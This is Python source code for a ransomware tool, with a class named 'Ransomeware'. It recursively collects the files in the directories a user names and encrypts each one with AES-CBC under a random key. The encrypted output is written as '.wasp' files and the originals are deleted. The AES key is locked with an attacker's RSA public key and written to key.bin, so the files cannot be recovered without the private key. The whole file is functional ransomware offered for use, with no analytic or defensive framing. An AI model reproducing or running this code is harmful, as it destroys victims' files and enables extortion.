from os import walk, path, remove
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from collections import deque
from multiprocessing import cpu_count, Pool, freeze_support
import argparse
 
class Ransomeware:
    def __init__(self):
        self.aeskey = get_random_bytes(16)
        self.files = deque()
        self.directories = None

    def rsa_ecrypt(self,InputKey,OutputKey):
        with open(InputKey, 'rb') as rsa_pub_key:
            key = RSA.importKey(rsa_pub_key.read())
        public_cryptor =  PKCS1_OAEP.new(key)
        encrypted_aes_key = public_cryptor.encrypt(self.aeskey)
        if OutputKey:
            with open(OutputKey, "wb") as ecaes:
                ecaes.write(encrypted_aes_key)
        else:
            with open("key.bin", "wb") as ecaes:
                ecaes.write(encrypted_aes_key)
        public_cryptor = None

    def get_files(self):
        for one in self.directories:
            for root, dirs, files in walk(one):
                for file in files:
                    self.files.append(path.join(root,file))

    def encrypt(self,file):
        with open(file, "rb") as d:
            iv = get_random_bytes(16)
            cipher = AES.new(self.aeskey, AES.MODE_CBC,iv)
            yield iv
            while True:
                chunk = d.read(1024)
                if not chunk:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b"\x00" * (16 - len(chunk) % 16)
                yield cipher.encrypt(chunk)

    def out_data(self,file,out):
        with open(f"{file}.wasp", "wb") as o:
            while True:
                try:
                    o.write(next(out))
                except StopIteration:
                    break
            
    def test(self,file):
        enc = self.encrypt(file)
        self.out_data(file,enc)
        remove(file)

    def worker(self):
        while self.files:
            file = self.files.pop()
            yield file

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-k','--key', help='RSA public key', required=True)
    parser.add_argument('-d','--dir', nargs='+', help='Directories to encrypt', required=True)
    parser.add_argument('-o','--out', help='output encrypted aes key', required=False)
    args = parser.parse_args()
    run = Ransomeware()
    run.directories = args.dir
    print("__START ENCRYPTION__")
    print("[+] getting all files and directories")
    run.get_files()
    print("[+] done")
    print("[+] encrypting aes key with rsa public key")
    run.rsa_ecrypt(args.key,args.out)
    print("[+] done.")
    print("[+] Multiprocess encryption start.")
    ok = run.worker()
    cpu = cpu_count()
    while True:
        try:
            with Pool(processes=cpu) as pool:
                pool.apply_async(run.test(next(ok)))
        except Exception as e:
            error = repr(e)
            if error == "StopIteration()":
                break
            else:
                print(error)
                continue
    print("[+] Multiprocess encryption end.")
    print("__END ENCRYPTION__")

if __name__ == '__main__':
    freeze_support()
    main()
